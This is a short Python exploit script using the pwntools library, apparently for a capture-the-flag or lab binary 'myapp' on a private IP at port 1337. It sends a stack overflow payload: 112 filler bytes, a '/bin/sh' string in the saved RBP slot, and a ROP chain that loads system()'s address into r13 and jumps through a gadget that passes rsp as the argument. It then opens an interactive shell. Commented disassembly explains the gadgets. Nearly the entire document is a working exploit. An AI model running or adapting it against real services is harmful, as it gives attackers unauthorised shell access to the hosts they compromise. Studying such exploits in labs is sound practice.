from pwn import *

p = remote("10.10.10.147", 1337)
#p = process("./myapp")

context(os="linux", arch="amd64")
context.log_level = "DEBUG"

JUNK = "A" * 112
JUNK += "/bin/sh\x00" # RBP

"""
ROP chain to populate r13 with system()'s address:

0x0000000000401206: pop r13; pop r14; pop r15; ret;

sym.test() -> Need to JMP to address of system at the end
 (fcn) sym.test 10
   sym.test ();
           0x00401152      55             push rbp
           0x00401153      4889e5         mov rbp, rsp
           0x00401156      4889e7         mov rdi, rsp
           0x00401159      41ffe5         jmp r13
"""

payload = JUNK + p64(0x0000000000401206)    # ROP chain gadget
payload += p64(0x401040)     # pop r13
payload += "BBBBBBBB"        # pop r14
payload += "CCCCCCCC"        # pop r15
payload += p64(0x00401152)   # sym.test

p.recvline()
p.sendline(payload)
p.interactive()
